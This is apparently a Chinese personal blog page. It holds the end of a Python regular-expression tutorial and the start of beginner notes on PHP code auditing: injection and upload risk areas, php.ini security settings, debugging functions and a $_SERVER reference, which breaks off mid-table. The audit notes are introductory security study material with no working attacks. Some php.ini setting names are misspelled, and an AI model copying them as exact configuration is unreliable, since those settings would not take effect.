<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">34</span></span><br><span class="line">&lt;_sre.SRE_Match object; span=(<span class="number">0</span>, <span class="number">13</span>), match='The <span class="number">123456</span> is'&gt;</span><br><span class="line">The <span class="number">123456</span> is</span><br><span class="line"><span class="number">123456</span></span><br><span class="line">(<span class="number">0</span>, <span class="number">13</span>)</span><br></pre></td></tr></table></figure>

<h4 id="3-通用匹配"><a href="#3-通用匹配" class="headerlink" title="3.通用匹配"></a>3.通用匹配</h4><p>. 表示匹配任意字符, *表示匹配前面字符无限次.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">content = <span class="string">'The 123456 is my one phone number.'</span></span><br><span class="line">result = re.match(<span class="string">r'^The.*number.$'</span>, content) <span class="comment">#使用match匹配, 第一个参数为正则表达式, 第二个为要匹配的字符串</span></span><br><span class="line">print(result)</span><br><span class="line">print(result.group()) <span class="comment">#输出匹配内容</span></span><br><span class="line">print(result.span()) <span class="comment">#输出匹配内容的位置索引</span></span><br></pre></td></tr></table></figure>

<p>结果</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;_sre.SRE_Match object; span=(<span class="number">0</span>, <span class="number">34</span>), match='The <span class="number">123456</span> <span class="keyword">is</span> <span class="keyword">my</span> one phone <span class="built_in">number</span>.'&gt;</span><br><span class="line">The <span class="number">123456</span> <span class="keyword">is</span> <span class="keyword">my</span> one phone <span class="built_in">number</span>.</span><br><span class="line">(<span class="number">0</span>, <span class="number">34</span>)</span><br></pre></td></tr></table></figure>

<h4 id="4-贪婪与非贪婪"><a href="#4-贪婪与非贪婪" class="headerlink" title="4.贪婪与非贪婪"></a>4.贪婪与非贪婪</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">content = <span class="string">'The 123456 is my one phone number.'</span></span><br><span class="line">print(<span class="string">'贪婪匹配:'</span>)</span><br><span class="line">result = re.match(<span class="string">r'^The.*(\d+).*'</span>, content) <span class="comment">#使用match匹配, 第一个参数为正则表达式, 第二个为要匹配的字符串</span></span><br><span class="line">print(result.group()) <span class="comment">#输出匹配内容</span></span><br><span class="line">print(<span class="string">'result = %s'</span>%result.group(<span class="number">1</span>)) <span class="comment">#输出第一个被()包裹的内容</span></span><br><span class="line">print(<span class="string">'-'</span>*<span class="number">20</span>)</span><br><span class="line">print(<span class="string">'非贪婪匹配:'</span>)</span><br><span class="line">result = re.match(<span class="string">r'^The.*?(\d+).*'</span>, content) </span><br><span class="line">print(result.group())</span><br><span class="line">print(<span class="string">'result = %s'</span>%result.group(<span class="number">1</span>))</span><br><span class="line">print(<span class="string">'-'</span>*<span class="number">20</span>)</span><br><span class="line">result = re.match(<span class="string">r'^The.*?(\d+).*?'</span>, content)</span><br><span class="line">print(result.group())</span><br></pre></td></tr></table></figure>

<p>结果</p>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">贪婪匹配:</span><br><span class="line">The 123456 is my one phone number.</span><br><span class="line">result = 6</span><br><span class="line">--------------------</span><br><span class="line">非贪婪匹配:</span><br><span class="line">The 123456 is my one phone number.</span><br><span class="line">result = 123456</span><br><span class="line">--------------------</span><br><span class="line">The 123456</span><br></pre></td></tr></table></figure>

<h4 id="5-修饰符-re-S"><a href="#5-修饰符-re-S" class="headerlink" title="5.修饰符 re.S"></a>5.修饰符 re.S</h4><p>由于加上re.S参数后, 通配符 . 将可以匹配换行符, 所以result不为空, result2为空。除了re.S, 还有许多修饰符如, </p>
<p>re.I: 使用匹配时忽略大小写。（大写的i）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">content = <span class="string">'''The 123456 is</span></span><br><span class="line"><span class="string">one of my phone.</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">result = re.match(<span class="string">'^The.*?(\d+).*?phone.'</span>, content, re.S)</span><br><span class="line"><span class="keyword">if</span> result:</span><br><span class="line">    print(result.group(<span class="number">1</span>))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">'result = None'</span>)</span><br><span class="line">result2 = re.match(<span class="string">'^The.*?(\d+).*?phone.'</span>, content)</span><br><span class="line"><span class="keyword">if</span> result2:</span><br><span class="line">    print(result2.group(<span class="number">1</span>))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">'result2 = None'</span>)</span><br></pre></td></tr></table></figure>

<p>结果</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">123456</span><br><span class="line">result2 = None</span><br></pre></td></tr></table></figure>

<h4 id="6-转义匹配"><a href="#6-转义匹配" class="headerlink" title="6.转义匹配"></a>6.转义匹配</h4><p>由于()属于正则表达式的特殊字符, 因此在需要匹配()时, 需要加上转义字符’’.</p>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line">content = <span class="string">'(百度)www.baidu.com'</span></span><br><span class="line">result = re.<span class="keyword">match</span>(<span class="string">'(百度)www.baidu.com'</span>, content)</span><br><span class="line">result2 = re.<span class="keyword">match</span>(<span class="string">'\(百度\)www\.baidu\.com'</span>, content)</span><br><span class="line"><span class="keyword">if</span> result:</span><br><span class="line">    <span class="keyword">print</span>(result.<span class="keyword">group</span>())</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">'result = None'</span>)</span><br><span class="line"><span class="keyword">if</span> result2:</span><br><span class="line">    <span class="keyword">print</span>(result2.<span class="keyword">group</span>())</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">'result2 = None'</span>)</span><br></pre></td></tr></table></figure>

<p>结果</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">result = None</span><br><span class="line">(百度)www<span class="selector-class">.baidu</span><span class="selector-class">.com</span></span><br></pre></td></tr></table></figure>

<h4 id="7-search-方法-与match-方法不同-不需要从头部开始匹配"><a href="#7-search-方法-与match-方法不同-不需要从头部开始匹配" class="headerlink" title="7.search()方法, 与match()方法不同, 不需要从头部开始匹配"></a>7.search()方法, 与match()方法不同, 不需要从头部开始匹配</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line"><span class="attribute">content</span> = <span class="string">'Other The 123456 is my one phone number.'</span></span><br><span class="line">result = re.search(<span class="string">'The.*?(\d+).*?number.'</span>, <span class="attribute">content</span>)</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(result.group()</span></span>)</span><br></pre></td></tr></table></figure>

<p>结果</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The <span class="number">123456</span> <span class="keyword">is</span> <span class="keyword">my</span> one phone <span class="built_in">number</span>.</span><br></pre></td></tr></table></figure>

<h4 id="8-findall-方法"><a href="#8-findall-方法" class="headerlink" title="8.findall()方法"></a>8.findall()方法</h4><p>match()和search()都是返回匹配到的第一个内容就结束匹配, findall()是返回所有符合匹配规则的内容</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line">html = '''</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"songs-list"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">class</span>=<span class="string">"title"</span>&gt;</span>歌单<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"introduction"</span>&gt;</span>歌单列表<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">id</span>=<span class="string">"list"</span> <span class="attr">class</span>=<span class="string">"list-group"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">data-view</span>=<span class="string">"2"</span>&gt;</span>一路上有你<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">data-view</span>=<span class="string">"7"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/2.mp3"</span> <span class="attr">singer</span>=<span class="string">"任贤齐"</span>&gt;</span>沧海一声笑<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">data-view</span>=<span class="string">"4"</span> <span class="attr">class</span>=<span class="string">"active"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/3.mp3"</span> <span class="attr">singer</span>=<span class="string">"齐秦"</span>&gt;</span>往事随风<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">data-view</span>=<span class="string">"6"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/4.mp3"</span> <span class="attr">singer</span>=<span class="string">"beyond"</span>&gt;</span>光辉岁月<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">data-view</span>=<span class="string">"5"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/5.mp3"</span> <span class="attr">singer</span>=<span class="string">"程慧玲"</span>&gt;</span>记事本<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">data-veiw</span>=<span class="string">"5"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/6.mp3"</span> <span class="attr">singer</span>=<span class="string">"邓丽君"</span>&gt;</span>但愿人长久<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">'''</span><br><span class="line"></span><br><span class="line">result = re.findall('<span class="tag">&lt;<span class="name">li.*?href="(.*?)".*?singer="(.*?)"</span>&gt;</span>(.*?)<span class="tag">&lt;/<span class="name">a</span>&gt;</span>', html, re.S)</span><br><span class="line">if result:</span><br><span class="line">    print(result)</span><br><span class="line">    for res in result:</span><br><span class="line">        print(res[0], res[1], res[2])</span><br></pre></td></tr></table></figure>

<p>结果</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[(<span class="string">'/2.mp3'</span>, <span class="string">'任贤齐'</span>, <span class="string">'沧海一声笑'</span>), (<span class="string">'/3.mp3'</span>, <span class="string">'齐秦'</span>, <span class="string">'往事随风'</span>), (<span class="string">'/4.mp3'</span>, <span class="string">'beyond'</span>, <span class="string">'光辉岁月'</span>), (<span class="string">'/5.mp3'</span>, <span class="string">'程慧玲'</span>, <span class="string">'记事本'</span>), (<span class="string">'/6.mp3'</span>, <span class="string">'邓丽君'</span>, <span class="string">'但愿人长久'</span>)]</span><br><span class="line">/<span class="number">2</span><span class="selector-class">.mp3</span> 任贤齐 沧海一声笑</span><br><span class="line">/<span class="number">3</span><span class="selector-class">.mp3</span> 齐秦 往事随风</span><br><span class="line">/<span class="number">4</span><span class="selector-class">.mp3</span> beyond 光辉岁月</span><br><span class="line">/<span class="number">5</span><span class="selector-class">.mp3</span> 程慧玲 记事本</span><br><span class="line">/<span class="number">6</span><span class="selector-class">.mp3</span> 邓丽君 但愿人长久</span><br></pre></td></tr></table></figure>

<h4 id="9-sub-方法-去除匹配的字符"><a href="#9-sub-方法-去除匹配的字符" class="headerlink" title="9.sub()方法, 去除匹配的字符"></a>9.sub()方法, 去除匹配的字符</h4><p>第二个参数是两个’，表示吧’\d+‘ 匹配的内容替换成空，如果写sub(’\d+’, ‘?’), 则把匹配的内容替换成 ?。</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line"><span class="attribute">content</span> = <span class="string">'54abc59de335f7778888g'</span></span><br><span class="line">result = re.sub(<span class="string">'\d+'</span>, <span class="string">''</span>, <span class="attribute">content</span>)</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(result)</span></span></span><br><span class="line">result = re.sub(<span class="string">'\d'</span>, <span class="string">'?'</span>, <span class="attribute">content</span>)</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(result)</span></span></span><br><span class="line">result = re.sub(<span class="string">'\d+'</span>, <span class="string">'?'</span>, <span class="attribute">content</span>)</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(result)</span></span></span><br></pre></td></tr></table></figure>

<p>结果</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">abcdefg</span><br><span class="line">??abc??<span class="keyword">de</span>???f???????<span class="keyword">g</span></span><br><span class="line">?abc?<span class="keyword">de</span>?f?<span class="keyword">g</span></span><br></pre></td></tr></table></figure>

<p>有点像replace，但是多一个正则关系匹配</p>
<h4 id="10-compile"><a href="#10-compile" class="headerlink" title="10.compile()"></a>10.compile()</h4><p>在需要匹配相同正则表达式情况下, 事先定义一个compile可以简化代码量, 同时compile中也可以使用修饰符re.S等.</p>
<p>( 其实也可以直接a=rule，然后 result = re.findall(a,string) ,但是这样子就不能用修饰符re.S了)</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line">content1 = '2016-1-1 12:01'</span><br><span class="line">content2 = '2017-1-1 12:02'</span><br><span class="line">content3 = '2018-1-1 12:03'</span><br><span class="line"></span><br><span class="line">pattern = re.compile('\d&#123;2&#125;:\d&#123;2&#125;')</span><br><span class="line">result1 = re.sub(pattern, '', content1)</span><br><span class="line">result2 = re.sub(pattern, '', content2)</span><br><span class="line">result3 = re.sub(pattern, '', content3)</span><br><span class="line">print(result1, result2, result3)</span><br></pre></td></tr></table></figure>

<p>结果</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2016</span><span class="number">-1</span><span class="number">-1</span>  <span class="number">2017</span><span class="number">-1</span><span class="number">-1</span>  <span class="number">2018</span><span class="number">-1</span><span class="number">-1</span></span><br></pre></td></tr></table></figure>

<p>附一手去除列表空元素的方法：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mytest = [<span class="selector-tag">i</span> <span class="keyword">for</span> <span class="selector-tag">i</span> <span class="keyword">in</span> test <span class="keyword">if</span> <span class="selector-tag">i</span> != <span class="string">''</span>]</span><br></pre></td></tr></table></figure>

<h3 id="番外"><a href="#番外" class="headerlink" title="番外"></a>番外</h3><p>这里记一下从从Li4n0学长脚本中发现的字符表替换函数：<strong>maketrans()</strong></p>
<p>语法：str.maketrans(intab, outtab)</p>
<p>参数：</p>
<p>intab – 字符串中要替代的字符组成的字符串</p>
<p>outtab – 相应的映射字符的字符串。</p>
<p>配合str.translate使用</p>
<p>实例</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">intab = <span class="string">"aeiou"</span></span><br><span class="line">outtab = <span class="string">"4310U"</span></span><br><span class="line">transtab = str.maketrans(intab, outtab)</span><br><span class="line"></span><br><span class="line">content = <span class="string">"this is string example....wow!!!"</span></span><br><span class="line">print (content.translate(transtab))</span><br></pre></td></tr></table></figure>

<p>结果</p>
<figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">th1s <span class="number">1</span>s str1ng <span class="number">3</span>x4mpl3....w0w!!!</span><br></pre></td></tr></table></figure>

<hr>
<p>参考资料：</p>
<p><a href="https://blog.csdn.net/qq_38038143/article/details/80671420" target="_blank" rel="noopener">https://blog.csdn.net/qq_38038143/article/details/80671420</a></p>
<p><a href="https://www.cnblogs.com/zjltt/p/6955965.html" target="_blank" rel="noopener">https://www.cnblogs.com/zjltt/p/6955965.html</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/07/21/python 正则/" data-id="ck2g3l2iu000rlgv3k9reqkp9" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/note/">note</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-代码审计基础入门笔记" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/07/18/代码审计基础入门笔记/" class="article-date">
  <time datetime="2019-07-18T06:46:35.000Z" itemprop="datePublished">2019-07-18</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/07/18/代码审计基础入门笔记/">代码审计基入门笔记</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="代码审计基础入门笔记"><a href="#代码审计基础入门笔记" class="headerlink" title="代码审计基础入门笔记"></a>代码审计基础入门笔记</h1><h3 id="审计大致方向、思路"><a href="#审计大致方向、思路" class="headerlink" title="审计大致方向、思路"></a>审计大致方向、思路</h3><p>注入</p>
<p>文件上传</p>
<p>跨站</p>
<p>程序异常处理</p>
<p>MVC架构：</p>
<p>Model：数据逻辑部分</p>
<p>View：处理数据显示的部分，显示数据</p>
<p>Controller：应用程序中处理用户交互的部分</p>
<p>常见php框架</p>
<p>先看手册、架构，安全过滤机制，</p>
<p>ThinkPHP</p>
<p>Yaf</p>
<p>Laravel</p>
<p>Kohana</p>
<p>Codelgniter</p>
<p>Yii</p>
<p>Smyfony</p>
<p>doitphp</p>
<p>处理流程</p>
<p>获取请求、<strong>全局过滤</strong>、模块文件、C函数内容、M函数内容、V显示</p>
<p>网站目录结构</p>
<p>主目录</p>
<p>模块目录</p>
<p>插件目录</p>
<p>上传目录</p>
<p>模块目录</p>
<p>数据目录</p>
<p>配置目录</p>
<p>配置文件</p>
<p>公共函数文件</p>
<p>安全过滤文件</p>
<p>数据库结构</p>
<p>入口文件</p>
<p>通读原文：函数集文件、配置文件（config.php）、安全过滤文件（lib.php）、index文件</p>
<p>敏感关键字回溯参数？</p>
<p>查找可控变量（高明的黑客）</p>
<p>功能点定向审计</p>
<p>程序安装、文件上传、文件管理、登录验证、备份恢复、找回密码</p>
<p>一切输入都是有害的</p>
<p>一切进入函数的变量都是有害的（危险函数）</p>
<h3 id="php-ini"><a href="#php-ini" class="headerlink" title="php.ini"></a>php.ini</h3><p>安全模式，safe_mode = off 【5.4.0后被移除】</p>
<p>禁用函数，disable_function = system</p>
<p>com组件,com.allow_dcom = false</p>
<p>全局变量注册开关 register_globals = Off    (使用$_GET[‘name’]来获取数据)</p>
<p>【为On时，POST或GET，都将自动使用全局变量的值来接受值】</p>
<p>魔术引号自动过滤： magic_quotes_gpc = on 开启时把单引号、双引号、反斜杠、和NULL加上反斜杠“\”进行转义，影响GET、POST、Cookies。开启以提高安全性，【5.4.0后被移除】</p>
<p>是否允许包含远程文件 allow_url_inlude = off</p>
<p>是否允许打开远程文件 allow_url_open = on</p>
<p>目录权限</p>
<p>HTTP头部版本信息泄露PHP版  expose_php = off</p>
<p>文件上传临时目录  upload_tmp_dir = （不设定则采用系统的临时目录）</p>
<p>用户可访问目录  open_basedir = E:\Local Test\WWW  (限制脚本的活动区域)</p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(<span class="name">scandir</span>(<span class="name">dirname</span>(<span class="name">path</span>: __FILE__.<span class="string">"./../"</span>)))(上层目录)</span><br></pre></td></tr></table></figure>

<p>内部错误选项   display_errors = on (调试时开启，发布后关闭，避免爆出物理地址)</p>
<p>错误报告级别  error_reporting = E_ALL &amp; ~E_NOTICE    (最高级别)</p>
<h3 id="代码调试小技巧"><a href="#代码调试小技巧" class="headerlink" title="代码调试小技巧"></a>代码调试小技巧</h3><p>print_r($var)</p>
<p>var_dump($var)    详细、数据类型、长度</p>
<p>debug_zval_dump  比print_r多一个调用次数</p>
<p>debug_print_backtrace();显示函数调用栈的信息</p>
<p>exit();当断点用好了</p>
<p>Xdebug，调试php代码的工具</p>
<p>配置</p>
<p><img src="/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563197438631.png" alt="1563197438631"></p>
<h3 id="全局变量和超全局变量"><a href="#全局变量和超全局变量" class="headerlink" title="全局变量和超全局变量"></a>全局变量和超全局变量</h3><p>全局变量：全局变量在函数外定义，作用于不到函数内，函数内一用，global $a;</p>
<p>超全局变量：所有脚本有效，$_GET,$_POST,$_SERVER,$_COOKIE,其他的存在$GLOBALS数组中</p>
<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_REQUEST	$_ENV	$_SESSION	$_FILES</span><br></pre></td></tr></table></figure>

<p>globals $name;    参数传递的作用</p>
<p>$GLOBALS[‘name’] =  123    变量的作用域设置的全局</p>
<p>$_REQUEST = POST or GET</p>
<p>$_SERVER     保存关于报头、路径和脚本位置的信息。</p>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">$_SERVER[<span class="string">'HTTP_HOST'</span>]  请求头信息中的Host内容，获取当前域名。</span><br><span class="line">$_SERVER[<span class="string">"SERVER_NAME"</span>]  输出配置文件httpd.conf中的ServerName，一般情况下与HTTP_HOST值相同，但如果服务器端口不是默认的<span class="number">80</span>端口，或者协议规范不是HTTP/<span class="number">1.1</span>时，HTTP_HOST会包含这些信息，而SERVER_NAME不一定包含。（主要看配置文件的设置）。</span><br><span class="line">$_SERVER[<span class="string">"HTTP_USER_AGENT"</span>]  获取用户相关信息，包括用户浏览器、操作系统等信息。</span><br><span class="line">$_SERVER[<span class="string">'HTTP_ACCEPT'</span>]  当前请求的ACCEPT头部信息。</span><br><span class="line">$_SERVER[<span class="string">"HTTP_ACCEPT_LANGUAGE"</span>]  这个值是由浏览器发送，表明用户默认的语言设置，后面的q值表示用户对该语言的喜好程度。</span><br><span class="line">$_SERVER[<span class="string">"HTTP_ACCEPT_ENCODING"</span>]  大部分的现代浏览器都支持gzip压缩，并会把这一信息报告给服务器。这时服务器就会压缩过的HTML发送给浏览器。这可以减少近<span class="number">80</span>%的文件大小，以节省下载时间和带宽。</span><br><span class="line">$_SERVER[<span class="string">"HTTP_COOKIE"</span>]  浏览器的cookie信息。</span><br><span class="line">$_SERVER[<span class="string">"HTTP_CONNECTION"</span>]  当前请求的连接情况。</span><br><span class="line">$_SERVER[<span class="string">"HTTP_UPGRADE_INSECURE_REQUESTS"</span>]  表示浏览器可读懂服务器发过来的请求，</span><br><span class="line">$_SERVER[<span class="string">"HTTP_CACHE_CONTROL"</span>]  表示浏览器是否会缓存这个页面信息。</span><br><span class="line">$_SERVER[<span class="string">"PATH"</span>]  当前脚本所在文件系统。</span><br><span class="line">$_SERVER[<span class="string">"SystemRoot"</span>]  当前服务器的操作系统。</span><br><span class="line">$_SERVER[<span class="string">"COMSPEC"</span>]  指向cmd.exe的路径。</span><br><span class="line">$_SERVER[<span class="string">"PATHEXT"</span>]  环境变量设置。</span><br><span class="line">$_SERVER[<span class="string">"WINDIR"</span>]  脚本指向的系统目录。</span><br><span class="line">$_SERVER[<span class="string">"SERVER_SIGNATURE"</span>]  包含服务器版本和虚拟主机名的字符串。</span><br><span class="line">$_SERVER[<span class="string">"SERVER_SOFTWARE"</span>]  服务器软件配置信息。</span><br><span class="line">$_SERVER[<span class="string">"SERVER_ADDR"</span>]  当前运行脚本的服务器的ip地址。</span><br><span class="line">$_SERVER[<span class="string">"SERVER_PORT"</span>]  服务器端口。</span><br><span class="line">$_SERVER[<span class="string">"REMOTE_ADDR"</span>]  浏览网页的用户ip。<span class="comment">//可以赋值以修改、伪造</span></span><br><span class="line">$_SERVER[<span class="string">"DOCUMENT_ROOT"</span>]  当前运行脚本所在的根目录。</span><br><span class="line">$_SERVER[<span class="string">"REQUEST_SCHEME"</span>]  服务器通信协议，是http或https。</span><br><span class="line">$_SERVER[<span class="string">"CONTEXT_PREFIX"</span>]  前缀。</span><br><span class="line">$_SERVER[<span class="string">"CONTEXT_DOCUMENT_ROOT"</span>]  当前脚本所在的文档根目录。</span><br><span class="line">$_SERVER[<span class="string">"SERVER_ADMIN"</span>]  服务器管理员信息。</span><br><span class="line">$_SERVER[<span class="string">"SCRIPT_FILENAME"</span>]  当前执行脚本的绝对路径。</span><br><span class="line">$_SERVER [<span class="string">"REMOTE_PORT"</span>]  用户连接到服务器时所使用的端口。</span><br><span class="line">$_SERVER[<span 